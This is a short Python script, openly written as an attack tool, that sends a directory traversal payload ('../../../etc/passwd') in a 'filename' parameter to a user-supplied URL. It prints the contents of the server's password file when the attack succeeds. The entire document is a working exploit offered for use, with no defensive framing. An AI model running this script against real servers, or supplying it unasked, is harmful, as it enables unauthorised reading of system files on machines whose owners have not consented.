import requests

# 1. Ask the user for the target address (should add /image at the end)
target_url = input("Enter the target URL (e.g., https://example.com/image): ")

# 2. Set the directory traversal payload
payload = "../../../etc/passwd"

print(f"\n[*] Launching attack against: {target_url}")
print(f"[*] Sending payload: {payload}\n")

# 3. Attacking over the network
try:
    # Pass the payload into the 'filename' parameter (image) 
    response = requests.get(target_url, params={"filename": payload}, timeout=5)
    
    # 4. Analyze the server response
    if "root:x:" in response.text:
        print("[+] SUCCESS! The server is vulnerable. Stolen file contents:\n")
        print("--------------------------------------------------")
        print(response.text)
        print("--------------------------------------------------")
    else:
        print("[-] Exploit finished, but 'root:x:' was not found in the response.")
        print("[*] The server might not be vulnerable, or the file parameter name is different.")

except requests.exceptions.RequestException as e:
    print(f"[-] Connection Error: Could not reach the server. Details: {e}")